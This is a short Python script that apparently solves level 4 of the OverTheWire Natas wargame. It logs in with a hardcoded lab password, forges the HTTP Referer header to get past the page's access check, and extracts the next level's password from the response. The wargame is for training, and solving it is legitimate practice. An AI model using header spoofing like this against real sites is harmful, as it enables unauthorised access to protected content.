import requests
import re

url = "http://natas4.natas.labs.overthewire.org/"
user = "natas4"
password = "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm"

headers = {"referer":"http://natas5.natas.labs.overthewire.org/"}

r = requests.get(url, auth=(user, password), headers=headers)
print("Natas5:"+re.findall(r"The password for natas5 is (.*)", r.text)[0])
